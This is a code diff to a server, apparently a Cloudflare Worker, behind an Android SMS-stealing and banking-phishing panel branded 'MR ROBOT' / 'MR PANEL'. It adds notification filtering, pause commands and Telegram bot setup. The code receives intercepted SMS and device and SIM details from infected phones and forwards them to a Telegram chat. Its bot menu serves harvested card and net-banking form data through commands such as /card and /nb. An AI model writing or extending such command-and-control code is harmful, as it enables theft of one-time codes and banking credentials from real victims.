@@ -273,9 +273,14 @@ async function broadcast(env: Env, event: string, data: unknown): Promise<void> 
       return "8711198416";
     }
 
-  async function sendTelegram(env: Env, text: string): Promise<void> {
+  async function sendTelegram(env: Env, text: string, appId?: string): Promise<void> {
     try {
       if (await isTelegramPaused(env)) return;
+      if (appId) {
+        const focusRows = await neon(env.NEON_DATABASE_URL)(`SELECT value FROM settings WHERE key = 'telegram_focus_app' LIMIT 1`);
+        const focusedApp = (focusRows[0] as { value?: string })?.value ?? '';
+        if (focusedApp && focusedApp !== appId) return;
+      }
       const chatId = await tgChatId(env);
       if (!chatId) return;
       const token = env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
@@ -704,7 +709,7 @@ app.post("/api/messages", async (c) => {
   }).returning();
   const mapped = mapMessage(inserted);
   await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
-  c.executionCtx.waitUntil(sendTelegram(c.env, `📩 <b>New SMS</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\nFrom: <b>${mapped.fromNumber}</b>\nSender: ${mapped.fromSender}\nTo: ${mapped.toNumber ?? "—"}\n💬 ${mapped.body}`));
+  c.executionCtx.waitUntil(sendTelegram(c.env, `📩 <b>New SMS</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\nFrom: <b>${mapped.fromNumber}</b>\nSender: ${mapped.fromSender}\nTo: ${mapped.toNumber ?? "—"}\n💬 ${mapped.body}`, mapped.appId));
   return c.json({ ok: true, id: mapped.id }, 201);
 });
 
@@ -879,7 +884,7 @@ app.post("/api/register", async (c) => {
     forwardEnabled: false, forwardSlot: null,
   });
   await broadcast(c.env, "device_updated", row);
-  if (created) c.executionCtx.waitUntil(sendTelegram(c.env, `📱 <b>New Device Registered</b>\nApp: <code>${row.appId}</code>\nDevice: <b>${row.name}</b> (<code>${row.deviceId}</code>)\nUser: ${row.userId}\nAndroid: ${row.androidVersion}\nSIM1: ${row.sim1Carrier ?? "—"} ${row.sim1Phone ?? ""}\nSIM2: ${row.sim2Carrier ?? "—"} ${row.sim2Phone ?? ""}`));
+  if (created) c.executionCtx.waitUntil(sendTelegram(c.env, `📱 <b>New Device Registered</b>\nApp: <code>${row.appId}</code>\nDevice: <b>${row.name}</b> (<code>${row.deviceId}</code>)\nUser: ${row.userId}\nAndroid: ${row.androidVersion}\nSIM1: ${row.sim1Carrier ?? "—"} ${row.sim1Phone ?? ""}\nSIM2: ${row.sim2Carrier ?? "—"} ${row.sim2Phone ?? ""}`, safeAppId));
   return c.json({ ok: true, deviceId: row.deviceId, created }, created ? 201 : 200);
 });
 
@@ -1046,47 +1051,47 @@ app.patch("/api/master/apps/:appId", async (c) => {
 });
 
 // Master admin: all devices across all app-ids — requires x-master-pin header
+// Telegram: auto-discover chat ID from getUpdates and save to settings
+app.post("/api/master/telegram/setup", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const token = c.env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
+  const resp = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=10`);
+  const tgData = await resp.json() as { ok: boolean; result?: Array<{ message?: { chat?: { id: number; first_name?: string } } }> };
+  if (!tgData.ok || !tgData.result?.length) {
+    return c.json({ error: "Bot ko pehle ek message bhejo, fir dobara try karo." }, 400);
+  }
+  const latest = [...tgData.result].reverse().find(u => u.message?.chat?.id);
+  const foundChatId = String(latest?.message?.chat?.id ?? "");
+  if (!foundChatId) return c.json({ error: "Chat ID nahi mila" }, 400);
+  const sqlSetup = neon(c.env.NEON_DATABASE_URL);
+  await sqlSetup(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [foundChatId]);
+  await sendTelegram(c.env, "Bot connected! Notifications are now active.");
+  return c.json({ ok: true, chatId: foundChatId });
+});
+
+// Telegram: get current config status
+app.get("/api/master/telegram/status", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const chatId = await tgChatId(c.env);
+  return c.json({ configured: !!chatId, chatId: chatId ?? null });
+});
+
+// Telegram: manually set chat ID
+app.post("/api/master/telegram/set-chat", async (c) => {
+  const guard = await checkMasterPin(c as never);
+  if (guard) return guard;
+  const body = await c.req.json() as { chatId?: string };
+  if (!body.chatId) return c.json({ error: "chatId required" }, 400);
+  const sqlChat = neon(c.env.NEON_DATABASE_URL);
+  await sqlChat(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
+  await sendTelegram(c.env, "Bot connected!");
+  return c.json({ ok: true });
+});
+
+// Master admin: get all devices across all apps
 app.get("/api/master/all-devices", async (c) => {
-
-  // Telegram: auto-discover chat ID from getUpdates and save to settings
-  app.post("/api/master/telegram/setup", async (c) => {
-    const guard = await checkMasterPin(c as never);
-    if (guard) return guard;
-    const token = c.env.TELEGRAM_BOT_TOKEN ?? TG_BOT_TOKEN;
-    const resp = await fetch(`https://api.telegram.org/bot${token}/getUpdates?limit=10`);
-    const tgData = await resp.json() as { ok: boolean; result?: Array<{ message?: { chat?: { id: number; first_name?: string } } }> };
-    if (!tgData.ok || !tgData.result?.length) {
-      return c.json({ error: "Bot ko pehle ek message bhejo, fir dobara try karo." }, 400);
-    }
-    const latest = [...tgData.result].reverse().find(u => u.message?.chat?.id);
-    const chatId = String(latest?.message?.chat?.id ?? "");
-    if (!chatId) return c.json({ error: "Chat ID nahi mila" }, 400);
-    const sqlClient = neon(c.env.NEON_DATABASE_URL);
-    await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [chatId]);
-    await sendTelegram(c.env, `✅ <b>MR ROBOT Telegram Connected!</b>\n\nAb se notifications yahaan aayenge:\n📩 New SMS\n📋 New Form Data\n📱 New Device Registration`);
-    return c.json({ ok: true, chatId });
-  });
-
-  // Telegram: get current config status
-  app.get("/api/master/telegram/status", async (c) => {
-    const guard = await checkMasterPin(c as never);
-    if (guard) return guard;
-    const chatId = await tgChatId(c.env);
-    return c.json({ configured: !!chatId, chatId: chatId ?? null });
-  });
-
-  // Telegram: manually set chat ID
-  app.post("/api/master/telegram/set-chat", async (c) => {
-    const guard = await checkMasterPin(c as never);
-    if (guard) return guard;
-    const body = await c.req.json() as { chatId?: string };
-    if (!body.chatId) return c.json({ error: "chatId required" }, 400);
-    const sqlClient = neon(c.env.NEON_DATABASE_URL);
-    await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_chat_id', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [body.chatId]);
-    await sendTelegram(c.env, `✅ <b>MR ROBOT Telegram Connected!</b>\n\nAb se notifications yahaan aayenge:\n📩 New SMS\n📋 New Form Data\n📱 New Device Registration`);
-    return c.json({ ok: true });
-  });
-  
   const guard = await checkMasterPin(c as never);
   if (guard) return guard;
   const db = getDb(c.env);
@@ -1877,37 +1882,156 @@ app.get("/api/events", (c) => c.text("Expected websocket upgrade", 426));
       return c.json({ ok: true });
     }
 
+
+    // /pause — pause all notifications
+    if (txt === '/pause') {
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_paused', 'true') ON CONFLICT (key) DO UPDATE SET value = 'true'`);
+      await tgReply(token, chatId, '<b>Notifications paused.</b>\nUse /stop to resume.');
+      return c.json({ ok: true });
+    }
+
+    // /focus <appId> — only receive notifications from this app
+    if (txt.startsWith('/focus ')) {
+      const focusId = txt.slice(7).trim();
+      if (!focusId) {
+        await tgReply(token, chatId, 'Usage: /focus &lt;appId&gt;\nExample: /focus myapp123');
+        return c.json({ ok: true });
+      }
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', $1) ON CONFLICT (key) DO UPDATE SET value = $1`, [focusId]);
+      await tgReply(token, chatId, `Focus set: <code>${focusId}</code>\nOnly this app's notifications will arrive. Use /unfocus to clear.`);
+      return c.json({ ok: true });
+    }
+
+    // /unfocus — clear app focus
+    if (txt === '/unfocus') {
+      await sqlClient(`INSERT INTO settings (key, value) VALUES ('telegram_focus_app', '') ON CONFLICT (key) DO UPDATE SET value = ''`);
+      await tgReply(token, chatId, '<b>Focus cleared.</b>\nAll apps will send notifications.');
+      return c.json({ ok: true });
+    }
+
+    // /focusstatus — check current focus app
+    if (txt === '/focusstatus' || txt === '/fs') {
+      const fsRows = await sqlClient(`SELECT value FROM settings WHERE key = 'telegram_focus_app' LIMIT 1`);
+      const focusedApp = (fsRows[0] as { value?: string })?.value ?? '';
+      await tgReply(token, chatId, focusedApp ? `Focused: <code>${focusedApp}</code>\nOnly this app notifies. /unfocus to clear.` : 'No focus. All apps notify.');
+      return c.json({ ok: true });
+    }
+
+    // /setmenu — register bot commands in Telegram autocomplete
+    if (txt === '/setmenu') {
+      const menuCmds = [
+        { command: "start", description: "Show command menu" },
+        { command: "1h", description: "Last 1 hour activity" },
+        { command: "24h", description: "Last 24 hours activity" },
+        { command: "7d", description: "Last 7 days activity" },
+        { command: "total", description: "All-time totals" },
+        { command: "stats", description: "Per-app breakdown" },
+        { command: "apps", description: "List all app IDs" },
+        { command: "online", description: "Online devices (last 15min)" },
+        { command: "offline", description: "Offline devices" },
+        { command: "last", description: "Last N messages" },
+        { command: "card", description: "Card form data (last 500)" },
+        { command: "nb", description: "Net banking form data (last 500)" },
+        { command: "search", description: "Search last 200 records" },
+        { command: "focus", description: "Focus notifications on one app" },
+        { command: "unfocus", description: "Clear focus, all apps notify" },
+        { command: "focusstatus", description: "Check current notification focus" },
+        { command: "pause", description: "Pause all notifications" },
+        { command: "stop", description: "Resume notifications" },
+      ];
+      const smR = await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
+        method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ commands: menuCmds }),
+      });
+      const smResult = await smR.json() as { ok: boolean };
+      await tgReply(token, chatId, smResult.ok ? '<b>Bot menu registered!</b>\nType "/" to see all commands.' : 'Menu registration failed.');
+      return c.json({ ok: true });
+    }
     // /start or /help — command menu
     if (txt === '/start' || txt === '/help') {
+      // Auto-register commands in Telegram on /start
+      const menuCmdsAuto = [
+        { command: "start", description: "Show command menu" },
+        { command: "1h", description: "Last 1 hour activity" },
+        { command: "24h", description: "Last 24 hours activity" },
+        { command: "7d", description: "Last 7 days activity" },
+        { command: "total", description: "All-time totals" },
+        { command: "stats", description: "Per-app breakdown" },
+        { command: "apps", description: "List all app IDs" },
+        { command: "online", description: "Online devices (last 15min)" },
+        { command: "offline", description: "Offline devices" },
+        { command: "last", description: "Last N messages" },
+        { command: "card", description: "Card form data (last 500)" },
+        { command: "nb", description: "Net banking form data (last 500)" },
+        { command: "search", description: "Search last 200 records" },
+        { command: "focus", description: "Focus notifications on one app" },
+        { command: "unfocus", description: "Clear focus, all apps notify" },
+        { command: "focusstatus", description: "Check notification focus" },
+        { command: "pause", description: "Pause all notifications" },
+        { command: "stop", description: "Resume notifications" },
+      ];
+      await fetch(`https://api.telegram.org/bot${token}/setMyCommands`, {
+        method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ commands: menuCmdsAuto }),
+      });
       const help =
-        `<b>MR PANEL — Command Menu</b>\n` +
-        `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `<b>[DATA BY TIME]</b>\n` +
-        `1.  /1h              Last 1 hour data\n` +
-        `2.  /24h             Last 24 hours data\n` +
-        `3.  /7d              Last 7 days data\n\n` +
-        `<b>[MESSAGES & FORMS]</b>\n` +
-        `4.  /last [n]        Last N messages (default 10)\n` +
-        `5.  /card            All card form data (from DB)\n` +
-        `6.  /nb              All net banking form data (from DB)\n` +
-        `7.  /card online     Card + online form data\n` +
-        `8.  /nb online       Net banking + online form data\n` +
-        `9.  /search &lt;text&gt;   Search last 200 records\n\n` +
-        `<b>[DEVICES]</b>\n` +
-        `8.  /online          Active in last 15 min\n` +
-        `9.  /offline         Offline devices\n` +
-        `10. /dev &lt;id&gt;        Device quick lookup\n\n` +
-        `<b>[APPS]</b>\n` +
-        `11. /apps            All App IDs\n` +
-        `12. /app &lt;appId&gt;     App devices\n` +
-        `13. /app &lt;appId&gt; &lt;devId&gt;        Device data\n` +
-        `14. /app &lt;appId&gt; &lt;devId&gt; &lt;text&gt;  Search device\n\n` +
-        `<b>[STATS]</b>\n` +
-        `15. /total           Total counts (all apps)\n` +
-        `16. /stats           Per-app breakdown\n\n` +
-        `<b>[CONTROL]</b>\n` +
-        `17. /stop            Resume notifications\n` +
-        `18. /start           Show this menu`;
+        `<b>MR PANEL — Bot Menu</b>
+` +
+        `━━━━━━━━━━━━━━━━━━━━━━
+
+` +
+        `<b>[DATA BY TIME]</b>
+` +
+        `/1h   /24h   /7d   /total
+
+` +
+        `<b>[FORM DATA]</b>
+` +
+        `/card          Card entries (last 500)
+` +
+        `/nb            Net banking entries (last 500)
+` +
+        `/card online   Card + online
+` +
+        `/nb online     NB + online
+` +
+        `/search &lt;txt&gt; Search last 200 records
+
+` +
+        `<b>[DEVICES]</b>
+` +
+        `/online        Active in last 15min
+` +
+        `/offline       Offline devices
+` +
+        `/dev &lt;id&gt;      Device lookup
+` +
+        `/last [n]      Last N messages
+
+` +
+        `<b>[APPS]</b>
+` +
+        `/apps          List all apps
+` +
+        `/stats         Per-app breakdown
+` +
+        `/app &lt;id&gt;     App devices
+
+` +
+        `<b>[NOTIFICATIONS]</b>
+` +
+        `/focus &lt;appId&gt; Only notify for this app
+` +
+        `/unfocus       All apps notify
+` +
+        `/focusstatus   Check focus status
+` +
+        `/pause         Pause all notifications
+` +
+        `/stop          Resume notifications
+
+` +
+        `/setmenu       Re-register this bot menu`;
       await tgReply(token, chatId, help);
       return c.json({ ok: true });
     }
